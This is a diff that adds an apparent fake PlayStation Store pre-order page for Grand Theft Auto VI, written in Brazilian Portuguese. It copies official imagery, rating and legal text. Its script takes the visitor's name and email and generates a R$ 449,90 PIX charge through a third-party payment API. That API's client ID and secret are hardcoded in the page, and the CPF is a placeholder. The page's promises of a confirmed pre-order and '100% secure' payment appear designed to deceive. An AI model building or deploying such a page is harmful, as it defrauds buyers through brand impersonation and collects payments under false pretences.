@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Comprar Grand Theft Auto VI | PS5</title>
+<link rel="stylesheet" href="playstation.com/css/font-all.css">
+<style>
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box }
+
+body {
+  font-family: "SST", helvetica, arial, sans-serif;
+  background: #1a1a1a;
+  color: #fff;
+  min-height: 100vh;
+}
+
+.container {
+  max-width: 100%;
+  margin: 0 auto;
+}
+
+.hero {
+  width: 100%;
+  height: 300px;
+  overflow: hidden;
+  position: relative;
+  background: linear-gradient(135deg, #0a1628, #001a4d);
+}
+
+.hero img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  opacity: .6;
+}
+
+.hero-overlay {
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  height: 60%;
+  background: linear-gradient(transparent, #1a1a1a);
+}
+
+.content {
+  max-width: 1000px;
+  margin: 0 auto;
+  padding: 32px 24px;
+}
+
+.product-header {
+  display: flex;
+  gap: 28px;
+  margin-bottom: 32px;
+  align-items: flex-start;
+}
+
+.boxart {
+  width: 160px;
+  flex-shrink: 0;
+  border-radius: 10px;
+  overflow: hidden;
+  box-shadow: 0 8px 30px rgba(0,0,0,.5);
+}
+
+.boxart img {
+  width: 100%;
+  display: block;
+}
+
+.product-info {
+  flex: 1;
+  padding-top: 4px;
+}
+
+.badge {
+  display: inline-block;
+  background: rgba(0,92,255,.2);
+  color: #4d8aff;
+  font-size: 12px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  padding: 4px 12px;
+  border-radius: 4px;
+  margin-bottom: 10px;
+}
+
+.product-info h1 {
+  font-size: 28px;
+  font-weight: 800;
+  margin-bottom: 4px;
+  line-height: 1.2;
+}
+
+.publisher {
+  font-size: 14px;
+  color: #999;
+  margin-bottom: 4px;
+}
+
+.genre {
+  font-size: 13px;
+  color: #777;
+  margin-bottom: 16px;
+}
+
+.price {
+  font-size: 32px;
+  font-weight: 300;
+  margin-bottom: 4px;
+}
+
+.price-sub {
+  font-size: 13px;
+  color: #888;
+  margin-bottom: 16px;
+}
+
+.badges-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin-bottom: 12px;
+}
+
+.badge-platform {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  background: rgba(0,92,255,.12);
+  border: 1px solid rgba(0,92,255,.25);
+  border-radius: 6px;
+  padding: 6px 14px;
+  font-size: 12px;
+  font-weight: 600;
+  color: #4d8aff;
+}
+
+.badge-platform svg {
+  width: 18px;
+  height: 18px;
+  fill: #4d8aff;
+}
+
+.badge-tag {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  background: rgba(255,255,255,.06);
+  border: 1px solid rgba(255,255,255,.1);
+  border-radius: 6px;
+  padding: 6px 12px;
+  font-size: 12px;
+  color: #bbb;
+}
+
+.info-bar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 16px;
+  padding: 16px 0;
+  margin-bottom: 24px;
+  border-top: 1px solid #2a2a2a;
+  border-bottom: 1px solid #2a2a2a;
+  font-size: 13px;
+  color: #999;
+}
+
+.info-bar span {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.rating-section {
+  background: rgba(255,255,255,.03);
+  border: 1px solid #2a2a2a;
+  border-radius: 10px;
+  padding: 20px;
+  margin-bottom: 24px;
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  gap: 16px;
+}
+
+.rating-badge {
+  width: 50px;
+  height: 50px;
+  background: #fff;
+  border-radius: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+  font-weight: 900;
+  color: #000;
+  flex-shrink: 0;
+}
+
+.rating-info {
+  flex: 1;
+}
+
+.rating-info a {
+  color: #4d8aff;
+  text-decoration: none;
+  font-size: 13px;
+  font-weight: 600;
+}
+
+.rating-info a:hover {
+  text-decoration: underline;
+}
+
+.rating-tags {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  margin-top: 4px;
+  font-size: 12px;
+  color: #888;
+}
+
+.notice {
+  font-size: 12px;
+  color: #777;
+  line-height: 1.6;
+  padding: 12px 0;
+  border-bottom: 1px solid #2a2a2a;
+  margin-bottom: 24px;
+}
+
+.notice a {
+  color: #4d8aff;
+  text-decoration: none;
+}
+
+.notice a:hover {
+  text-decoration: underline;
+}
+
+.description {
+  margin-bottom: 32px;
+}
+
+.description h2 {
+  font-size: 20px;
+  font-weight: 700;
+  margin-bottom: 16px;
+  color: #fff;
+}
+
+.description p {
+  font-size: 14px;
+  line-height: 1.8;
+  color: #bbb;
+  margin-bottom: 16px;
+}
+
+.description .highlight {
+  background: rgba(0,92,255,.08);
+  border-left: 3px solid #005CFF;
+  padding: 16px 20px;
+  border-radius: 0 8px 8px 0;
+  margin-bottom: 20px;
+}
+
+.description .highlight p {
+  margin-bottom: 4px;
+  color: #ccc;
+}
+
+.features {
+  list-style: none;
+  padding: 0;
+}
+
+.features li {
+  position: relative;
+  padding: 10px 0 10px 20px;
+  font-size: 14px;
+  line-height: 1.7;
+  color: #bbb;
+  border-bottom: 1px solid rgba(255,255,255,.04);
+}
+
+.features li::before {
+  content: "\00b7";
+  position: absolute;
+  left: 4px;
+  color: #005CFF;
+  font-weight: 700;
+}
+
+.features-section-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: #4d8aff;
+  margin: 24px 0 12px;
+  padding-top: 16px;
+  border-top: 1px solid #2a2a2a;
+}
+
+.legal {
+  font-size: 11px;
+  color: #555;
+  line-height: 1.6;
+  padding-top: 24px;
+  border-top: 1px solid #2a2a2a;
+  margin-top: 32px;
+}
+
+.actions {
+  display: flex;
+  gap: 12px;
+  margin: 24px 0 32px;
+}
+
+.btn-primary {
+  flex: 1;
+  padding: 14px 32px;
+  background: linear-gradient(135deg, #003791, #005CFF);
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 700;
+  font-family: inherit;
+  cursor: pointer;
+  text-decoration: none;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  transition: all .3s;
+  min-width: 200px;
+}
+
+.btn-primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 30px rgba(0,92,255,.3);
+}
+
+.btn-secondary {
+  padding: 14px 24px;
+  background: rgba(255,255,255,.06);
+  color: #fff;
+  border: 1px solid rgba(255,255,255,.12);
+  border-radius: 8px;
+  font-size: 13px;
+  font-weight: 600;
+  font-family: inherit;
+  cursor: pointer;
+  text-decoration: none;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  transition: all .2s;
+}
+
+.btn-secondary:hover {
+  background: rgba(255,255,255,.1);
+}
+
+@media(max-width:640px) {
+  .product-header {
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+  }
+  .boxart {
+    width: 140px;
+  }
+  .badges-row {
+    justify-content: center;
+  }
+  .product-info h1 {
+    font-size: 22px;
+  }
+  .actions {
+    flex-direction: column;
+  }
+  .hero {
+    height: 200px;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="hero">
+    <img src="https://gmedia.playstation.com/is/image/SIEPDC/Grand-Theft-Auto-VI-pre-order-hero-desktop-03-19jun25$en?$2400px$" alt="Grand Theft Auto VI">
+    <div class="hero-overlay"></div>
+  </div>
+
+  <div class="content">
+    <div class="product-header">
+      <div class="boxart">
+        <img src="https://gmedia.playstation.com/is/image/SIEPDC/Grand-Theft-Auto-VI-packshot-01-19jun25$en?$2400px$" alt="Grand Theft Auto VI">
+      </div>
+      <div class="product-info">
+        <span class="badge">Pré-encomenda</span>
+        <h1>Grand Theft Auto VI</h1>
+        <p class="publisher">Rockstar Games</p>
+        <p class="genre">Ação e Aventura</p>
+        <div class="price">R$ 449,90</div>
+        <p class="price-sub">Pré-encomende agora e receba na data de lançamento</p>
+        <div class="badges-row">
+          <span class="badge-platform">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+            PS5
+          </span>
+          <span class="badge-tag">Pré-encomenda</span>
+          <span class="badge-tag">13 Idiomas com suporte</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="info-bar">
+      <span>Otimizado para PS5</span>
+      <span>|</span>
+      <span>Pré-encomenda</span>
+      <span>|</span>
+      <span>13 Idiomas com suporte</span>
+    </div>
+
+    <div class="rating-section">
+      <div class="rating-badge">18</div>
+      <div class="rating-info">
+        <a href="https://www.gov.br/mj/pt-br/assuntos/seus-direitos/classificacao-1">18 anos</a>
+        <div class="rating-tags">
+          <span>Violência Extrema</span>
+          <span>Conteúdo Sexual</span>
+          <span>Drogas Lícitas</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="notice">
+      Os fornecedores de jogos iniciados por você recebem acesso às suas informações de perfil da PlayStation Network e aos dados associados enquanto você joga.
+      <a href="https://www.playstation.com/pt-br/legal/">Saiba mais</a>
+      <br><br>
+      + Ofertas em compras no aplicativo.
+      <br>
+      Informações de controle dos pais.
+      <a href="https://www.playstation.com/pt-br/support/account/parental-controls/">Saiba mais</a>
+    </div>
+
+    <div class="description">
+      <h2>Descrição</h2>
+
+      <div class="highlight">
+        <p>Compre antes de 20 de novembro para receber:</p>
+        <p>- O Pacote Vintage Vice City</p>
+        <p>- Um mês de GTA+</p>
+      </div>
+
+    <div class="action-bar">
+      <button class="btn-primary" id="btnPreorder">PRÉ-ENCOMENDE AGORA</button>
+      <button class="btn-secondary" onclick="window.location.href='playstation.com/index.html'">VER MAIS</button>
+    </div>
+
+    <div class="form-card" id="formCard">
+      <h3>Finalizar pré-encomenda</h3>
+      <form id="checkoutForm">
+        <div class="form-group">
+          <label for="name">Nome completo</label>
+          <input type="text" id="name" placeholder="Seu nome" required>
+        </div>
+        <div class="form-group">
+          <label for="email">E-mail</label>
+          <input type="email" id="email" placeholder="seu@email.com" required>
+        </div>
+
+        <button type="submit" class="btn-primary" id="btnPay" style="width:100%;margin-top:4px">
+          <span id="btnText">GERAR PIX - R$ 449,90</span>
+        </button>
+      </form>
+    </div>
+
+    <div class="pix-section" id="pixSection">
+      <div class="check-icon">&#10003;</div>
+      <h3>Pré-encomenda confirmada!</h3>
+      <p>Pague o PIX abaixo para garantir sua cópia no PS5</p>
+      <div class="qr-box" id="qrContainer">
+        <div style="color:#888;font-size:12px">Carregando QR Code...</div>
+      </div>
+
+      <p>Receba um mês de GTA+ com a sua reserva. Ele deve ser resgatado em até 180 dias depois de fazer a sua reserva. O resgate da afiliação não está disponível para contas de criança com restrições em conteúdo com restrições de idade. Você receberá uma notificação pop-up no console quando o seu mês de afiliação do GTA+ estiver disponível para resgate. Abra a loja, selecione o ícone do seu perfil no canto superior esquerdo e selecione "Ofertas &amp; créditos" para encontrar e resgatar essa oferta. Limite de um resgate por conta da plataforma.</p>
+
+      <p>Grand Theft Auto VI é uma experiência para um jogador.</p>
+
+      <p>Vice City, EUA. Jason e Lucia sempre souberam que tudo estava contra eles. Mas, depois que um serviço simples dá errado, eles vão parar no lado mais sombrio do lugar mais ensolarado dos Estados Unidos, em meio a uma conspiração criminosa se estendendo por todo o estado de Leonida — e são forçados a depender um do outro mais do que nunca para saírem dessa vivos.</p>
+    </div>
+    </div>
+
+    <div class="legal">
+      &copy; 1997–2026. Rockstar Games Inc. Rockstar Games, Grand Theft Auto, Grand Theft Auto VI, VI e R*, e logotipos relacionados são marcas comerciais da Take-Two Interactive Software, Inc. Todas as demais marcas e marcas comerciais são propriedades dos respectivos donos. Todos os direitos reservados.
+      <br><br>
+      Pagamento 100% seguro via PIX • Confirmação instantânea
+    </div>
+  </div>
+</div>
+
+<div class="copied-msg" id="copiedMsg">Código PIX copiado!</div>
+
+<script>
+const API_BASE = 'https://api.syncpayments.com.br/api/partner/v1';
+const CLIENT_ID = '2ca9e7c7-0677-44b9-abe3-3c1bfd4fa77d';
+const CLIENT_SECRET = '5467e5a0-744e-445d-a106-c3adb2953079';
+let accessToken = null;
+
+async function getToken() {
+  const res = await fetch(API_BASE+'/auth-token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ client_id: CLIENT_ID, client_secret: CLIENT_SECRET })
+  });
+  if (!res.ok) throw new Error('Falha ao autenticar');
+  return (await res.json()).access_token;
+}
+
+async function createPix(name, email, amount) {
+  const res = await fetch(API_BASE+'/cash-in', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Accept': 'application/json',
+      'Authorization': 'Bearer '+accessToken
+    },
+    body: JSON.stringify({
+      amount: amount,
+      description: 'GTA VI - PS5 Pré-encomenda',
+      client: { name, email, cpf: '00000000000', phone: '00000000000' }
+    })
+  });
+  if (!res.ok) throw new Error('Falha ao gerar PIX');
+  return await res.json();
+}
+
+document.getElementById('checkoutForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const btn = document.getElementById('btnPay');
+  const bt = document.getElementById('btnText');
+  const name = document.getElementById('name').value.trim();
+  const email = document.getElementById('email').value.trim();
+  if (!name || !email) return;
+  btn.disabled = true;
+  bt.innerHTML = '<span class="loading"></span> Gerando PIX...';
+  try {
+    accessToken = await getToken();
+    const result = await createPix(name, email, 449.90);
+    document.getElementById('pixCodeText').textContent = result.pix_code;
+    const qrC = document.getElementById('qrContainer');
+    qrC.innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data='+encodeURIComponent(result.pix_code)+'" alt="QR Code PIX">';
+    document.getElementById('pixSection').classList.add('active');
+    document.getElementById('formCard').style.display = 'none';
+    document.getElementById('pixSection').scrollIntoView({ behavior: 'smooth', block: 'center' });
+    bt.textContent = 'PIX GERADO!';
+  } catch(err) {
+    bt.textContent = err.message+' - Tente novamente';
+    btn.disabled = false;
+    setTimeout(() => { bt.textContent = 'GERAR PIX - R$ 449,90'; }, 3000);
+  }
+});
+
+async function copyPix() {
+  const text = document.getElementById('pixCodeText').textContent;
+  if (!text || text === 'Carregando...') return;
+  try {
+    await navigator.clipboard.writeText(text);
+    document.getElementById('copiedMsg').classList.add('show');
+    setTimeout(() => document.getElementById('copiedMsg').classList.remove('show'), 2500);
+  } catch {}
+}
+</script>
+
+</body>
+</html>
